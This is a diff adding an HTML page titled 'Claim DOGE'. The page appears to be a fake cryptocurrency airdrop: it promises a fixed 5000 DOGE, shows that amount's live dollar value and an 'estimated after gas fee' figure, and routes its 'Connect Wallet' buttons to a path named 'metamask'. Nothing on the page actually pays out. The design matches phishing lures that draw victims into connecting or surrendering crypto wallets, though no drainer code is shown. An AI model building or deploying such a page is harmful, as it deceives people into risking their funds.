@@ -1,0 +1,137 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Claim DOGE</title>
+    <link rel="icon" type="image/png" href="https://s2.coinmarketcap.com/static/img/coins/64x64/74.png">
+    <link rel="stylesheet" href="styles.css">
+    <style>
+        body {
+            background: #c2a633;
+            background-image: url('doge-bg.png');
+            background-size: cover;
+            background-position: center;
+            color: black;
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            text-align: center;
+            margin: 0;
+            padding: 0;
+        }
+        .navbar {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 20px;
+            background: #f4c542;
+        }
+        .logo img {
+            width: 50px;
+        }
+        .menu .btn {
+            background: #e4b20c;
+            border: none;
+            padding: 10px 15px;
+            color: black;
+            font-weight: bold;
+            cursor: pointer;
+            margin-left: 10px;
+            border-radius: 5px;
+        }
+        .menu .btn.swap {
+            background: #ffd700;
+        }
+        .menu .btn.connect {
+            background: #ffcc00;
+        }
+        .container {
+            max-width: 400px;
+            margin: 50px auto;
+            background: rgba(255, 255, 255, 0.8);
+            padding: 20px;
+            border-radius: 10px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.2);
+        }
+        .claim-box {
+            background: rgba(255, 255, 255, 0.9);
+            padding: 15px;
+            border-radius: 5px;
+            margin: 10px 0;
+        }
+        .claim-btn {
+            background: #ffcc00;
+            border: none;
+            padding: 10px;
+            color: black;
+            font-weight: bold;
+            width: 100%;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        input[type="text"], input[type="number"] {
+            width: calc(100% - 20px);
+            padding: 10px;
+            margin-top: 10px;
+            border: 1px solid #e4b20c;
+            border-radius: 5px;
+        }
+        input[type="number"] {
+            background: #f0f0f0;
+            pointer-events: none;
+            user-select: none;
+        }
+        .coin-select img {
+            width: 20px;
+            height: auto;
+            vertical-align: middle;
+        }
+    </style>
+    <script>
+        async function updatePrice() {
+            try {
+                const response = await fetch('https://api.coingecko.com/api/v3/simple/price?ids=dogecoin&vs_currencies=usd');
+                const data = await response.json();
+                const dogePrice = data.dogecoin.usd;
+                document.getElementById('doge-price').innerText = dogePrice.toFixed(4);
+                const amount = 5000;
+                const gasFee = 10; // Example gas fee deduction
+                const netAmount = amount - gasFee;
+                const totalValue = (dogePrice * amount).toFixed(2);
+                const netValue = (dogePrice * netAmount).toFixed(2);
+                document.getElementById('doge-value').innerText = `$${totalValue}`;
+                document.getElementById('net-value').innerText = `Estimated after gas fee: ${netAmount} DOGE (~$${netValue})`;
+            } catch (error) {
+                console.error('Error fetching price:', error);
+            }
+        }
+        window.onload = updatePrice;
+    </script>
+</head>
+<body>
+    <nav class="navbar">
+        <div class="logo">
+            <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/74.png" alt="Logo">
+        </div>
+        <div class="menu">
+           
+            <button class="btn connect" onclick="location.href='metamask'">Connect Wallet</button>
+        </div>
+    </nav>
+    <main class="container">
+        <h1>Claim</h1>
+        <p>1 DOGE = <span id="doge-price">Loading...</span> USD</p>
+        <div class="claim-box">
+            <label>From <span class="currency">DOGE</span></label>
+            <input type="number" value="5000" readonly>
+            <span class="value" id="doge-value">Loading...</span>
+            <p id="net-value">Loading...</p>
+            <div class="coin-select">
+                <img src="https://s2.coinmarketcap.com/static/img/coins/64x64/74.png" alt="DOGE">
+                <span>DOGE</span>
+            </div>
+        </div>
+        <input type="text" placeholder="Enter recipient's address (optional)"><br><br>
+        <button class="btn claim-btn" onclick="location.href='metamask'">Connect to DOGE chain</button>
+    </main>
+</body>
+</html>
